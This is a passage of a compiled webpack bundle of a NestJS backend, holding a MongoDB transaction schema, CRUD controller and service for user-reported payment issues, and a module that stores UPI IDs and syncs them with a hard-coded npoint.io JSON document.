const create_transaction_dto_1 = __webpack_require__(/*! ../dto/create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
let Transaction = class Transaction {
};
exports.Transaction = Transaction;
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Unique transaction ID (UTR)' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        required: true,
        unique: true,
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "transactionId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Amount involved in the transaction' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.Number,
        required: true,
        min: 0
    }),
    __metadata("design:type", Number)
], Transaction.prototype, "amount", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Issue type reported by the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        required: true,
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "issue", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Description of issue reported by the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        required: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "description", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Refund method selected by the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined',
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "refundMethod", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User profile ID' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined',
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "profile", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'User chat ID' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined',
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "chatId", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'IP address of the user' }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        default: 'undefined'
    }),
    __metadata("design:type", String)
], Transaction.prototype, "ip", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({
        description: 'Transaction status',
        enum: create_transaction_dto_1.TransactionStatus,
        default: create_transaction_dto_1.TransactionStatus.PENDING
    }),
    (0, mongoose_1.Prop)({
        type: mongoose_2.Schema.Types.String,
        enum: Object.values(create_transaction_dto_1.TransactionStatus),
        default: create_transaction_dto_1.TransactionStatus.PENDING,
        index: true
    }),
    __metadata("design:type", String)
], Transaction.prototype, "status", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Creation timestamp' }),
    (0, mongoose_1.Prop)({ type: Date }),
    __metadata("design:type", Date)
], Transaction.prototype, "createdAt", void 0);
__decorate([
    (0, swagger_1.ApiProperty)({ description: 'Last update timestamp' }),
    (0, mongoose_1.Prop)({ type: Date }),
    __metadata("design:type", Date)
], Transaction.prototype, "updatedAt", void 0);
exports.Transaction = Transaction = __decorate([
    (0, mongoose_1.Schema)({
        collection: 'transactions',
        versionKey: false,
        autoIndex: true,
        timestamps: true,
        toJSON: {
            virtuals: true,
            transform: (doc, ret) => {
                ret['id'] = ret._id;
                delete ret._id;
                return ret;
            },
        }
    })
], Transaction);
exports.TransactionSchema = mongoose_1.SchemaFactory.createForClass(Transaction);


/***/ }),

/***/ "./src/components/transactions/transaction.controller.ts":
/*!***************************************************************!*\
  !*** ./src/components/transactions/transaction.controller.ts ***!
  \***************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const create_transaction_dto_1 = __webpack_require__(/*! ./dto/create-transaction.dto */ "./src/components/transactions/dto/create-transaction.dto.ts");
const update_transaction_dto_1 = __webpack_require__(/*! ./dto/update-transaction.dto */ "./src/components/transactions/dto/update-transaction.dto.ts");
const transaction_service_1 = __webpack_require__(/*! ./transaction.service */ "./src/components/transactions/transaction.service.ts");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
let TransactionController = class TransactionController {
    constructor(transactionService) {
        this.transactionService = transactionService;
    }
    async create(createTransactionDto) {
        return this.transactionService.create(createTransactionDto);
    }
    async findOne(id) {
        return this.transactionService.findOne(id);
    }
    async findAll(transactionId, amount, issue, refundMethod, profile, chatId, ip, status, limit, offset) {
        return this.transactionService.findAll({ transactionId, amount, issue, refundMethod, profile, chatId, status, ip }, limit, offset);
    }
    async update(id, updateTransactionDto) {
        return this.transactionService.update(id, updateTransactionDto);
    }
    async delete(id) {
        return this.transactionService.delete(id);
    }
};
exports.TransactionController = TransactionController;
__decorate([
    (0, common_1.Post)(),
    (0, swagger_1.ApiOperation)({
        summary: 'Create a new transaction',
        description: 'Creates a new transaction record with the provided details'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.CREATED,
        description: 'Transaction created successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid input data provided.'
    }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [create_transaction_dto_1.CreateTransactionDto]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "create", null);
__decorate([
    (0, common_1.Get)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get transaction by ID',
        description: 'Retrieves a specific transaction by its unique identifier'
    }),
    (0, swagger_1.ApiParam)({
        name: 'id',
        description: 'Transaction unique identifier',
        required: true
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transaction retrieved successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.NOT_FOUND,
        description: 'Transaction not found.'
    }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "findOne", null);
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({
        summary: 'Get all transactions',
        description: 'Retrieves all transactions with optional filtering, pagination and sorting'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transactions retrieved successfully.',
        type: [transaction_schema_1.Transaction]
    }),
    (0, swagger_1.ApiQuery)({ name: 'transactionId', required: false, description: 'Filter by transaction ID (UTR)' }),
    (0, swagger_1.ApiQuery)({ name: 'amount', required: false, type: 'number', description: 'Filter by transaction amount' }),
    (0, swagger_1.ApiQuery)({ name: 'issue', required: false, description: 'Filter by issue type' }),
    (0, swagger_1.ApiQuery)({ name: 'refundMethod', required: false, description: 'Filter by refund method' }),
    (0, swagger_1.ApiQuery)({ name: 'profile', required: false, description: 'Filter by user profile' }),
    (0, swagger_1.ApiQuery)({ name: 'chatId', required: false, description: 'Filter by chat ID' }),
    (0, swagger_1.ApiQuery)({ name: 'ip', required: false, description: 'Filter by IP address' }),
    (0, swagger_1.ApiQuery)({ name: 'status', required: false, description: 'Filter by transaction status' }),
    (0, swagger_1.ApiQuery)({ name: 'limit', required: false, type: 'number', description: 'Number of records to return', example: 10 }),
    (0, swagger_1.ApiQuery)({ name: 'offset', required: false, type: 'number', description: 'Number of records to skip', example: 0 }),
    __param(0, (0, common_1.Query)('transactionId')),
    __param(1, (0, common_1.Query)('amount')),
    __param(2, (0, common_1.Query)('issue')),
    __param(3, (0, common_1.Query)('refundMethod')),
    __param(4, (0, common_1.Query)('profile')),
    __param(5, (0, common_1.Query)('chatId')),
    __param(6, (0, common_1.Query)('ip')),
    __param(7, (0, common_1.Query)('status')),
    __param(8, (0, common_1.Query)('limit')),
    __param(9, (0, common_1.Query)('offset')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number, String, String, String, String, String, String, Number, Number]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "findAll", null);
__decorate([
    (0, common_1.Put)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Update a transaction',
        description: 'Updates an existing transaction by its unique identifier'
    }),
    (0, swagger_1.ApiParam)({
        name: 'id',
        description: 'Transaction unique identifier',
        required: true
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transaction updated successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.NOT_FOUND,
        description: 'Transaction not found.'
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.BAD_REQUEST,
        description: 'Invalid input data provided.'
    }),
    __param(0, (0, common_1.Param)('id')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, update_transaction_dto_1.UpdateTransactionDto]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "update", null);
__decorate([
    (0, common_1.Delete)(':id'),
    (0, swagger_1.ApiOperation)({
        summary: 'Delete a transaction',
        description: 'Deletes a transaction by its unique identifier'
    }),
    (0, swagger_1.ApiParam)({
        name: 'id',
        description: 'Transaction unique identifier',
        required: true
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.OK,
        description: 'Transaction deleted successfully.',
        type: transaction_schema_1.Transaction
    }),
    (0, swagger_1.ApiResponse)({
        status: common_1.HttpStatus.NOT_FOUND,
        description: 'Transaction not found.'
    }),
    __param(0, (0, common_1.Param)('id')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String]),
    __metadata("design:returntype", Promise)
], TransactionController.prototype, "delete", null);
exports.TransactionController = TransactionController = __decorate([
    (0, swagger_1.ApiTags)('Transactions'),
    (0, common_1.Controller)('transactions'),
    __metadata("design:paramtypes", [transaction_service_1.TransactionService])
], TransactionController);


/***/ }),

/***/ "./src/components/transactions/transaction.module.ts":
/*!***********************************************************!*\
  !*** ./src/components/transactions/transaction.module.ts ***!
  \***********************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const transaction_service_1 = __webpack_require__(/*! ./transaction.service */ "./src/components/transactions/transaction.service.ts");
const transaction_controller_1 = __webpack_require__(/*! ./transaction.controller */ "./src/components/transactions/transaction.controller.ts");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
const init_module_1 = __webpack_require__(/*! ../ConfigurationInit/init.module */ "./src/components/ConfigurationInit/init.module.ts");
let TransactionModule = class TransactionModule {
};
exports.TransactionModule = TransactionModule;
exports.TransactionModule = TransactionModule = __decorate([
    (0, common_1.Module)({
        imports: [
            init_module_1.InitModule,
            mongoose_1.MongooseModule.forFeature([
                { name: transaction_schema_1.Transaction.name, schema: transaction_schema_1.TransactionSchema },
            ]),
        ],
        controllers: [transaction_controller_1.TransactionController],
        providers: [transaction_service_1.TransactionService],
        exports: [transaction_service_1.TransactionService]
    })
], TransactionModule);


/***/ }),

/***/ "./src/components/transactions/transaction.service.ts":
/*!************************************************************!*\
  !*** ./src/components/transactions/transaction.service.ts ***!
  \************************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var TransactionService_1;
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TransactionService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const transaction_schema_1 = __webpack_require__(/*! ./schemas/transaction.schema */ "./src/components/transactions/schemas/transaction.schema.ts");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const logbots_1 = __webpack_require__(/*! ../../utils/logbots */ "./src/utils/logbots.ts");
let TransactionService = TransactionService_1 = class TransactionService {
    constructor(transactionModel) {
        this.transactionModel = transactionModel;
        this.logger = new common_1.Logger(TransactionService_1.name);
    }
    async create(createTransactionDto) {
        this.logger.log(`Creating new transaction: ${JSON.stringify(createTransactionDto)}`);
        try {
            const existingTransaction = await this.transactionModel
                .findOne({ transactionId: createTransactionDto.transactionId })
                .exec();
            if (existingTransaction) {
                throw new common_1.BadRequestException('Transaction with this ID already exists');
            }
            const newTransaction = new this.transactionModel(createTransactionDto);
            const savedTransaction = await newTransaction.save();
            this.logger.log(`Transaction created successfully: ${savedTransaction.transactionId}`);
            return savedTransaction;
        }
        catch (error) {
            this.logger.error(`Error creating transaction: ${error.message}`, error.stack);
            throw error instanceof common_1.BadRequestException ? error : new common_1.BadRequestException('Failed to create transaction');
        }
    }
    async findOne(id) {
        this.logger.debug(`Finding transaction by ID: ${id}`);
        try {
            const transaction = await this.transactionModel.findById(id).exec();
            if (!transaction) {
                this.logger.warn(`Transaction not found with ID: ${id}`);
                throw new common_1.NotFoundException('Transaction not found');
            }
            return transaction;
        }
        catch (error) {
            this.logger.error(`Error finding transaction: ${error.message}`, error.stack);
            if (error instanceof common_1.NotFoundException)
                throw error;
            throw new common_1.BadRequestException('Invalid transaction ID format');
        }
    }
    async findAll(filters, limit = 10, offset = 0) {
        this.logger.debug(`Finding transactions with filters: ${JSON.stringify(filters)}`);
        try {
            let query = {};
            let transactions = [];
            let total = 0;
            if (filters.transactionId) {
                const transactionIdQuery = {
                    $or: [
                        { transactionId: filters.transactionId.toLowerCase() }
                    ]
                };
                if ((0, mongoose_2.isValidObjectId)(filters.transactionId)) {
                    transactionIdQuery.$or.push({ _id: filters.transactionId });
                }
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(transactionIdQuery)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(transactionIdQuery).exec(),
                ]);
                if (total > 0) {
                    this.logger.debug(`Found ${total} transactions matching transactionId: ${filters.transactionId}`);
                    await this.sendNotification(filters, total);
                    return { transactions, total };
                }
            }
            if (filters.ip) {
                query = { ip: filters.ip };
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(query)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(query).exec(),
                ]);
                if (total > 0) {
                    this.logger.debug(`Found ${total} transactions matching ip: ${filters.ip}`);
                    await this.sendNotification(filters, total);
                    return { transactions, total };
                }
            }
            if (filters.chatId) {
                query = { chatId: filters.chatId };
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(query)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(query).exec(),
                ]);
                if (total > 0) {
                    this.logger.debug(`Found ${total} transactions matching chatId: ${filters.chatId}`);
                    await this.sendNotification(filters, total);
                    return { transactions, total };
                }
            }
            const remainingFilters = {};
            if (filters.profile)
                remainingFilters['profile'] = filters.profile;
            if (filters.amount)
                remainingFilters['amount'] = filters.amount;
            if (filters.issue)
                remainingFilters['issue'] = filters.issue;
            if (filters.refundMethod)
                remainingFilters['refundMethod'] = filters.refundMethod;
            if (filters.status)
                remainingFilters['status'] = filters.status;
            if (Object.keys(remainingFilters).length > 0) {
                query = remainingFilters;
                [transactions, total] = await Promise.all([
                    this.transactionModel
                        .find(query)
                        .sort({ createdAt: -1 })
                        .skip(offset)
                        .limit(limit)
                        .exec(),
                    this.transactionModel.countDocuments(query).exec(),
                ]);
            }
            this.logger.debug(`Found ${total} transactions matching remaining filters`);
            await this.sendNotification(filters, total);
            return { transactions, total };
        }
        catch (error) {
            this.logger.error(`Error finding transactions: ${error.message}`, error.stack);
            throw new common_1.BadRequestException('Failed to fetch transactions');
        }
    }
    async sendNotification(filters, total) {
        try {
            await (0, fetchWithTimeout_1.fetchWithTimeout)(`${(0, logbots_1.notifbot)(process.env.accountsChannel)}&text=${encodeURIComponent(`Found ${total} transactions matching ip: ${filters.ip || 'N/A'}\nchatId: ${filters.chatId || 'N/A'}\ntransactionId: ${filters.transactionId || 'N/A'}\nprofile: ${filters.profile || 'N/A'}`)}`);
        }
        catch (error) {
            this.logger.error(`Failed to send notification: ${error.message}`);
        }
    }
    async update(id, updateTransactionDto) {
        this.logger.debug(`Updating transaction ${id} with data: ${JSON.stringify(updateTransactionDto)}`);
        try {
            const updatedTransaction = await this.transactionModel
                .findByIdAndUpdate(id, updateTransactionDto, {
                new: true,
                runValidators: true
            })
                .exec();
            if (!updatedTransaction) {
                this.logger.warn(`Transaction not found for update with ID: ${id}`);
                throw new common_1.NotFoundException('Transaction not found');
            }
            this.logger.log(`Transaction ${id} updated successfully`);
            return updatedTransaction;
        }
        catch (error) {
            this.logger.error(`Error updating transaction: ${error.message}`, error.stack);
            if (error instanceof common_1.NotFoundException)
                throw error;
            throw new common_1.BadRequestException('Failed to update transaction');
        }
    }
    async delete(id) {
        this.logger.debug(`Deleting transaction: ${id}`);
        try {
            const deletedTransaction = await this.transactionModel.findByIdAndDelete(id).exec();
            if (!deletedTransaction) {
                this.logger.warn(`Transaction not found for deletion with ID: ${id}`);
                throw new common_1.NotFoundException('Transaction not found');
            }
            this.logger.log(`Transaction ${id} deleted successfully`);
            return deletedTransaction;
        }
        catch (error) {
            this.logger.error(`Error deleting transaction: ${error.message}`, error.stack);
            if (error instanceof common_1.NotFoundException)
                throw error;
            throw new common_1.BadRequestException('Failed to delete transaction');
        }
    }
};
exports.TransactionService = TransactionService;
exports.TransactionService = TransactionService = TransactionService_1 = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)(transaction_schema_1.Transaction.name)),
    __metadata("design:paramtypes", [mongoose_2.Model])
], TransactionService);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.controller.ts":
/*!******************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.controller.ts ***!
  \******************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdController = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const swagger_1 = __webpack_require__(/*! @nestjs/swagger */ "@nestjs/swagger");
const upi_ids_service_1 = __webpack_require__(/*! ./upi-ids.service */ "./src/components/upi-ids/upi-ids.service.ts");
let UpiIdController = class UpiIdController {
    constructor(UpiIdService) {
        this.UpiIdService = UpiIdService;
    }
    async findOne() {
        return this.UpiIdService.findOne();
    }
    async update(updateUpiIdsdto) {
        return this.UpiIdService.update(updateUpiIdsdto);
    }
};
exports.UpiIdController = UpiIdController;
__decorate([
    (0, common_1.Get)(),
    (0, swagger_1.ApiOperation)({ summary: 'Get Upi Ids' }),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", []),
    __metadata("design:returntype", Promise)
], UpiIdController.prototype, "findOne", null);
__decorate([
    (0, common_1.Patch)(),
    (0, swagger_1.ApiOperation)({ summary: 'Update Upi Ids' }),
    (0, swagger_1.ApiBody)({ type: Object }),
    __param(0, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [Object]),
    __metadata("design:returntype", Promise)
], UpiIdController.prototype, "update", null);
exports.UpiIdController = UpiIdController = __decorate([
    (0, swagger_1.ApiTags)('UPI Ids'),
    (0, common_1.Controller)('upi-ids'),
    __metadata("design:paramtypes", [upi_ids_service_1.UpiIdService])
], UpiIdController);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.module.ts":
/*!**************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.module.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const upi_ids_service_1 = __webpack_require__(/*! ./upi-ids.service */ "./src/components/upi-ids/upi-ids.service.ts");
const upi_ids_controller_1 = __webpack_require__(/*! ./upi-ids.controller */ "./src/components/upi-ids/upi-ids.controller.ts");
const upi_ids_schema_1 = __webpack_require__(/*! ./upi-ids.schema */ "./src/components/upi-ids/upi-ids.schema.ts");
const npoint_module_1 = __webpack_require__(/*! ../n-point/npoint.module */ "./src/components/n-point/npoint.module.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let UpiIdModule = class UpiIdModule {
};
exports.UpiIdModule = UpiIdModule;
exports.UpiIdModule = UpiIdModule = __decorate([
    (0, common_1.Global)(),
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            UpiIdModule,
            npoint_module_1.NpointModule,
            mongoose_1.MongooseModule.forFeature([{ name: 'UpiIdModule', collection: 'upi-ids', schema: upi_ids_schema_1.UpiIdSchema }]),
        ],
        providers: [upi_ids_service_1.UpiIdService],
        controllers: [upi_ids_controller_1.UpiIdController],
        exports: [upi_ids_service_1.UpiIdService],
    })
], UpiIdModule);


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.schema.ts":
/*!**************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.schema.ts ***!
  \**************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdSchema = exports.UpiId = void 0;
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __importDefault(__webpack_require__(/*! mongoose */ "mongoose"));
let UpiId = class UpiId {
};
exports.UpiId = UpiId;
exports.UpiId = UpiId = __decorate([
    (0, mongoose_1.Schema)({
        versionKey: false,
        autoIndex: true,
        timestamps: false,
        toJSON: {
            virtuals: false,
            transform: (doc, ret) => {
                delete ret._id;
            },
        },
    })
], UpiId);
exports.UpiIdSchema = mongoose_1.SchemaFactory.createForClass(UpiId);
exports.UpiIdSchema.add({ type: mongoose_2.default.Schema.Types.Mixed });


/***/ }),

/***/ "./src/components/upi-ids/upi-ids.service.ts":
/*!***************************************************!*\
  !*** ./src/components/upi-ids/upi-ids.service.ts ***!
  \***************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.UpiIdService = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const mongoose_1 = __webpack_require__(/*! @nestjs/mongoose */ "@nestjs/mongoose");
const mongoose_2 = __webpack_require__(/*! mongoose */ "mongoose");
const axios_1 = __importDefault(__webpack_require__(/*! axios */ "axios"));
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const npoint_service_1 = __webpack_require__(/*! ../n-point/npoint.service */ "./src/components/n-point/npoint.service.ts");
let UpiIdService = class UpiIdService {
    constructor(UpiIdModel, npointSerive) {
        this.UpiIdModel = UpiIdModel;
        this.npointSerive = npointSerive;
        this.checkInterval = null;
        this.upiIds = {};
        this.findOne().then(() => {
            this.checkInterval = setInterval(async () => {
                await this.refreshUPIs();
                await this.checkNpoint();
            }, 5 * 60000);
        });
    }
    onModuleDestroy() {
        if (this.checkInterval) {
            clearInterval(this.checkInterval);
        }
    }
    onModuleInit() {
        console.log("UPI ID Service Initialized");
    }
    async refreshUPIs() {
        console.log("Refreshing UPIs");
        const result = await this.UpiIdModel.findOne({}).lean().exec();
        if (result) {
            this.upiIds = result;
        }
    }
    async checkNpoint() {
        const upiIds = (await axios_1.default.get('https://api.npoint.io/54baf762fd873c55c6b1')).data;
        const existingUpiIds = await this.findOne();
        if ((0, utils_1.areJsonsNotSame)(upiIds, existingUpiIds)) {
            await this.npointSerive.updateDocument("54baf762fd873c55c6b1", existingUpiIds);
        }
    }
    async findOne() {
        if (Object.keys(this.upiIds).length > 0) {
            return this.upiIds;
        }
        const result = await this.UpiIdModel.findOne({}).lean().exec();
        if (!result)
            return null;
        this.upiIds = result;
        console.log("Refreshed UPIs");
        return result;
    }
    async update(updateClientDto) {
        delete updateClientDto['_id'];
        const updatedUser = await this.UpiIdModel.findOneAndUpdate({}, { $set: { ...updateClientDto } }, { new: true, upsert: true, lean: true }).exec();
        if (!updatedUser) {
            throw new common_1.NotFoundException(`UpiIdModel not found`);
        }
        this.upiIds = updatedUser;
        console.log("Refreshed UPIs");
        return updatedUser;
    }
};
exports.UpiIdService = UpiIdService;
exports.UpiIdService = UpiIdService = __decorate([
    (0, common_1.Injectable)(),
    __param(0, (0, mongoose_1.InjectModel)('UpiIdModule')),
